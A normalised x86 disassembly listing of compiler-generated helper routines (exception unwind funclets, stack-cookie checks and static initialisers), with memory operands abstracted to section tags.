jmp sub_100018c0
sub_1002dca1
lea ecx [ ebp - 0xc8 ]
jmp sub_100018c0
sub_1002dcac
lea ecx [ ebp - 0xac ]
jmp sub_100018c0
sub_1002dcb7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10c ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002dce0
lea ecx [ ebp + 0x8 ]
jmp sub_100018c0
sub_1002dce8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002dd10
lea ecx [ ebp + 0x8 ]
jmp sub_100018c0
sub_1002dd18
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002dd40
lea ecx [ ebp + 0xc ]
jmp sub_100018c0
sub_1002dd48
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002dd70
lea ecx [ ebp + 0xc ]
jmp sub_100018c0
sub_1002dd78
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002dda0
mov ecx [ ebp - 0xd0 ]
add ecx 0x8
jmp sub_100018c0
sub_1002ddae
mov ecx [ ebp - 0xd0 ]
add ecx 0x24
jmp sub_100018c0
sub_1002ddbc
mov ecx [ ebp - 0xd0 ]
add ecx 0x48
jmp sub_100018c0
sub_1002ddca
mov eax [ ebp - 0xc4 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002ddd8
lea ecx [ ebp - 0xb8 ]
jmp sub_100018c0
sub_1002dde3
lea ecx [ ebp - 0x9c ]
jmp sub_100018c0
sub_1002ddee
lea ecx [ ebp - 0x48 ]
jmp sub_100018c0
sub_1002ddf6
lea ecx [ ebp - 0x2c ]
jmp sub_100018c0
sub_1002ddfe
lea ecx [ ebp - 0x64 ]
jmp sub_100018c0
sub_1002de06
lea ecx [ ebp - 0x80 ]
jmp sub_100018c0
sub_1002de0e
lea ecx [ ebp - 0x48 ]
jmp sub_100018c0
sub_1002de16
lea ecx [ ebp - 0x2c ]
jmp sub_100018c0
sub_1002de1e
lea ecx [ ebp - 0x80 ]
jmp sub_100018c0
sub_1002de26
lea ecx [ ebp - 0x64 ]
jmp sub_100018c0
sub_1002de2e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xd4 ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002de60
lea ecx [ ebp - 0x8c ]
jmp sub_100060b0
sub_1002de6b
mov eax [ ebp + 0x8 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002de76
mov eax [ ebp - 0x14 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002de81
mov eax [ ebp - 0x18 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002de8c
mov eax [ ebp - 0x18 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002de97
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002deb5
mov ecx [ ebp - 0x10 ]
jmp sub_100092c0
sub_1002debd
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_100098c0
sub_1002dec8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002dee3
lea ecx [ ebp - 0x10 ]
jmp sub_100193bf
sub_1002deeb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002df06
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002df30
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002df40
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002df60
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002df80
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002df90
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002dfa0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002dfc0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002dfe0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e000
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e020
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e040
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e060
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e070
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e090
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e0b0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e0c0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e0d0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e0f0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e110
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e120
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e140
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e160
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e180
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e190
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e1b0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e1d0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e1e0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e1f0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e210
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e230
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e240
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e250
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e270
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e290
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e2a0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e2b0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e2d0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e2f0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e300
push 0x1
push r--data
mov ecx rw-data
call sub_10007470
push sub_1002e800
call sub_1001b004
pop ecx
retn
sub_1002e320
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e330
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e350
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e370
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e380
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e390
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e3b0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e3d0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e3e0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e3f0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e410
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e430
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e440
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e450
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e470
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e490
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e4a0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e4b0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e4d0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e4f0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e500
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e510
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e530
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e550
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e560
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e570
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e590
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e5b0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e5c0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e5d0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e5f0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e610
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e620
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e640
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e660
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e680
push 0x1
push r--data
mov ecx rw-data
call sub_10007470
push sub_1002e830
call sub_1001b004
pop ecx
retn
sub_1002e6a0
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
retn
sub_1002e6b0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e6d0
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e6f0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_1002e700
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e720
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e740
mov ecx [ rw-data ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
retn
sub_1002e760
push 0x1
push r--data
mov ecx rw-data
call sub_10007470
push sub_1002e860
call sub_1001b004
pop ecx
retn
sub_1002e77d
mov ecx rw-data
call sub_1001933d
push sub_1002e88e
call sub_1001b004
pop ecx
retn
sub_1002e793
push sub_1002e8a2
call sub_1001b004
pop ecx
retn
sub_1002e79f
push sub_1002e898
call sub_1001b004
pop ecx
retn
sub_1002e7ab
push sub_1002e8ac
call sub_1001b004
pop ecx
retn
sub_1002e7b7
push sub_1002e8b7
call sub_1001b004
pop ecx
retn
sub_1002e7c3
push sub_1002e8c2
call sub_1001b004
pop ecx
retn
sub_1002e7cf
mov ecx rw-data
call sub_1001933d
push sub_1002e8cd
call sub_1001b004
pop ecx
retn
sub_1002e7e5
push sub_1002e8d7
call sub_1001b004
pop ecx
retn
sub_1002e800
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_10019ce4
add esp 0x4
sub_1002e830
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_10019ce4
add esp 0x4
sub_1002e860
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_10019ce4
add esp 0x4
sub_1002e88e
mov ecx rw-data
jmp sub_1001936e
sub_1002e898
mov ecx rw-data
jmp sub_100092d0
sub_1002e8a2
mov ecx rw-data
jmp sub_100194f2
sub_1002e8ac
mov [ rw-data ] r--data
retn
sub_1002e8b7
mov [ rw-data ] r--data
retn
sub_1002e8c2
mov [ rw-data ] r--data
retn
sub_1002e8cd
mov ecx rw-data
jmp sub_1001936e
sub_1002e8d7
mov ecx rw-data
jmp sub_10019af2
sub_1002e8e1
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10019c01
